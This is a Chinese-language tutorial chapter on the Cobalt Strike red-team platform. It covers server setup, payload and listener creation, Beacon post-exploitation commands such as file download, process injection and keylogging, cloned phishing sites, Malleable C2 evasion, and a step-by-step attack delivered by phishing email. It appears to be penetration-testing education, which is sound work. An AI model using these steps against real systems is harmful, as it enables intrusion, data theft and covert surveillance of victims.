# 第十八章：Cobalt Strike - 渗透测试平台

## 18.1 Cobalt Strike 简介

### 什么是 Cobalt Strike？

Cobalt Strike是一个专业的渗透测试平台，用于红队攻击和安全评估。

**Cobalt Strike**的特点：
- 团队协作
- 多种攻击方式
- Beacon后渗透
- 隐蔽通信
- 图形化界面

简单来说，Cobalt Strike是**专业红队的攻击平台**。

### 核心组件

| 组件 | 功能 |
|------|------|
| Team Server | 团队服务器 |
| Cobalt Strike Client | 客户端 |
| Beacon | 后渗透代理 |
| Aggressor Script | 扩展脚本 |

---

## 18.2 安装与部署

### 系统要求

| 要求 | 说明 |
|------|------|
| Team Server | Linux服务器 |
| Client | Windows/Linux/Mac |
| Java | Java 8+ |

### Team Server部署

**步骤1：上传文件**

上传Cobalt Strike到Linux服务器。

**步骤2：解压文件**

```bash
tar -xzf cobaltstrike.tar.gz
cd cobaltstrike
```

**步骤3：启动Team Server**

```bash
./teamserver <IP> <password> [C2profile]
```

参数说明：
- `<IP>`：服务器IP
- `<password>`：团队密码
- `[C2profile]`：可选的C2配置文件

### Client启动

**Windows：**
双击`cobaltstrike.exe`

**Linux：**
```bash
./cobaltstrike
```

**连接Team Server：**
1. 输入Team Server IP
2. 输入团队密码
3. 输入用户名
4. 点击连接

---

## 18.3 界面介绍

### 主界面布局

| 区域 | 功能 |
|------|------|
| 目标列表 | 已控制的目标 |
| 会话列表 | Beacon会话 |
| 工具栏 | 快速操作 |
| 日志 | 操作日志 |

### 常用功能

| 功能 | 说明 |
|------|------|
| Payload生成 | 生成攻击载荷 |
| Web钓鱼 | 创建钓鱼页面 |
| Beacon管理 | 管理受控目标 |
| 后渗透 | 执行后续攻击 |

---

## 18.4 Payload生成详解

### 生成Payload

1. 点击"Cobalt Strike" → "Payloads"
2. 选择Payload类型
3. 配置监听器
4. 生成Payload

### Payload类型

| 类型 | 说明 |
|------|------|
| Windows Executable | Windows可执行文件 |
| PowerShell | PowerShell脚本 |
| Web Drive-by | Web下载方式 |
| HTA | HTML应用 |

### 监听器配置

监听器定义Beacon回连地址：
1. 点击"Cobalt Strike" → "Listeners"
2. 点击"Add"
3. 配置监听器：
   - Name：监听器名称
   - Payload：Beacon类型
   - Host：回连地址
   - Port：回连端口

---

## 18.5 Beacon 使用详解

### 什么是Beacon？

Beacon是Cobalt Strike的后渗透代理，通过C2通信控制目标。

### Beacon会话

当目标执行Payload后，Beacon会连接回来，出现在会话列表。

### Beacon功能

| 功能 | 说明 |
|------|------|
| shell | 执行命令 |
| download | 下载文件 |
| upload | 上传文件 |
| execute | 执行程序 |
| ps | 列出进程 |
| jobs | 列出任务 |
| screenshot | 截屏 |
| keylogger | 键盘记录 |

### Beacon交互

右键Beacon会话，选择"Interact"，输入命令：
```
beacon> shell whoami
beacon> download C:\secret.txt
```

---

## 18.6 后渗透功能详解

### 文件操作

**下载文件：**
```
beacon> download C:\file.txt
```

**上传文件：**
```
beacon> upload /path/to/file.exe
```

### 进程管理

**列出进程：**
```
beacon> ps
```

**注入进程：**
```
beacon> inject <pid> <listener>
```

### 截屏

```
beacon> screenshot
```

### 键盘记录

```
beacon> keylogger
```

---

## 18.7 Web钓鱼详解

### 创建钓鱼页面

1. 点击"Attacks" → "Web Drive-by" → "Manage Sites"
2. 点击"Add"
3. 配置钓鱼页面
4. 启动钓鱼服务

### 钓鱼方式

| 方式 | 说明 |
|------|------|
| Scripted Web Delivery | 轳本下载 |
| Web钓鱼 | 钓鱼页面 |
| 克隆网站 | 复制目标网站 |

---

## 18.8 C2隐蔽技术详解

### 什么是C2隐蔽？

C2隐蔽让Beacon通信不易被检测。

### Malleable C2 Profile

Malleable C2 Profile是配置文件，定义通信方式：
- HTTP头伪装
- 数据编码
- 通信频率

### 使用C2 Profile

```bash
./teamserver <IP> <password> myprofile.profile
```

---

## 18.9 实战案例：快速攻击

### 场景说明

获取目标主机控制权。

### 步骤

**步骤1：生成Payload**
- 生成Windows可执行文件
- 配置监听器

**步骤2：投递Payload**
- 通过钓鱼邮件
- 通过Web下载

**步骤3：等待连接**
- Beacon连接回来

**步骤4：执行后渗透**
- 截屏、下载文件、执行命令

---

## 总结

本章介绍了Cobalt Strike的使用：

1. **安装部署**：Team Server和Client
2. **界面介绍**：主界面布局
3. **Payload生成**：各种载荷类型
4. **Beacon使用**：后渗透代理
5. **后渗透功能**：文件操作、截屏等
6. **Web钓鱼**：创建钓鱼页面
7. **C2隐蔽**：通信隐蔽技术

Cobalt Strike是专业红队的核心平台。

下一章我们将学习Empire——PowerShell后渗透框架！